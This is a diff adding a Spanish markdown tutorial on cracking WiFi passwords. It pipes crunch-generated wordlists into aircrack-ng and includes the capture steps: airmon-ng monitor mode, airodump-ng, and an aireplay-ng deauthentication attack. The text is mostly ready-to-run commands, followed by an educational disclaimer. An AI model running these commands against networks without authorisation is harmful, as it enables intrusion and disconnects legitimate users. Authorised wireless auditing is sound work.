@@ -1,0 +1,101 @@
+```markdown
+# Uso de `crunch` y `aircrack-ng` para Ataques de Fuerza Bruta en Redes WiFi
+
+## Descripción
+
+Este documento describe cómo utilizar `crunch` junto con `aircrack-ng` para realizar un ataque de fuerza bruta a una red WiFi capturando paquetes con el objetivo de descubrir la contraseña de la red.
+
+## Requisitos
+
+- [crunch](https://sourceforge.net/projects/crunch-wordlist/)
+- [aircrack-ng](https://www.aircrack-ng.org/)
+- Archivo de captura (`capture.cap`) que contiene el handshake de la red WiFi objetivo.
+
+## Comando
+
+```sh
+crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -w - -b 00:11:22:33:44:55 capture.cap
+```
+
+### Explicación del Comando
+
+1. **crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789**:
+   - `crunch`: Herramienta que genera listas de palabras.
+   - `8 8`: Genera todas las combinaciones posibles de 8 caracteres de longitud.
+   - `abcdefghijklmnopqrstuvwxyz0123456789`: Conjunto de caracteres a utilizar para generar las combinaciones.
+
+2. **|**:
+   - Tubería que pasa la salida de `crunch` directamente como entrada a `aircrack-ng`.
+
+3. **aircrack-ng -w - -b 00:11:22:33:44:55 capture.cap**:
+   - `aircrack-ng`: Herramienta de auditoría de redes WiFi.
+   - `-w -`: Indica a `aircrack-ng` que use la entrada estándar (stdin) como lista de palabras.
+   - `-b 00:11:22:33:44:55`: Dirección MAC (BSSID) del punto de acceso objetivo.
+   - `capture.cap`: Archivo de captura que contiene el handshake de la red WiFi.
+
+## Cambiar la Longitud de las Contraseñas
+
+Para buscar contraseñas de diferente longitud, simplemente ajusta los parámetros de longitud en el comando `crunch`.
+
+### Contraseñas de Menor Longitud
+
+Para buscar contraseñas de 6 caracteres de longitud:
+
+```sh
+crunch 6 6 abcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -w - -b 00:11:22:33:44:55 capture.cap
+```
+
+### Contraseñas de Mayor Longitud
+
+Para buscar contraseñas de 10 caracteres de longitud:
+
+```sh
+crunch 10 10 abcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -w - -b 00:11:22:33:44:55 capture.cap
+```
+
+### Contraseñas con Longitud Variable
+
+Para buscar contraseñas con una longitud variable entre 6 y 10 caracteres:
+
+```sh
+crunch 6 10 abcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -w - -b 00:11:22:33:44:55 capture.cap
+```
+
+## Pasos Detallados
+
+1. **Instalación de Herramientas**:
+   - Para instalar `crunch` y `aircrack-ng`, puedes usar tu gestor de paquetes preferido. Por ejemplo, en sistemas basados en Debian:
+     ```sh
+     sudo apt-get update
+     sudo apt-get install crunch aircrack-ng
+     ```
+
+2. **Captura del Handshake**:
+   - Utiliza `airmon-ng` para poner tu adaptador de red en modo monitor:
+     ```sh
+     sudo airmon-ng start wlan0
+     ```
+   - Inicia la captura de paquetes con `airodump-ng`:
+     ```sh
+     sudo airodump-ng --bssid 00:11:22:33:44:55 -c [channel] -w capture wlan0mon
+     ```
+   - Realiza un ataque de deautenticación para capturar el handshake:
+     ```sh
+     sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 wlan0mon
+     ```
+
+3. **Ataque de Fuerza Bruta**:
+   - Una vez capturado el handshake, utiliza el comando mencionado para iniciar el ataque de fuerza bruta:
+     ```sh
+     crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -w - -b 00:11:22:33:44:55 capture.cap
+     ```
+
+## Advertencia
+
+Este documento tiene fines educativos. Realizar ataques a redes sin permiso es ilegal y está penado por la ley. Utiliza este conocimiento de manera ética y siempre con autorización expresa del propietario de la red.
+
+## Referencias
+
+- [Crunch Wordlist Generator](https://sourceforge.net/projects/crunch-wordlist/)
+- [Aircrack-ng Suite](https://www.aircrack-ng.org/)
+```
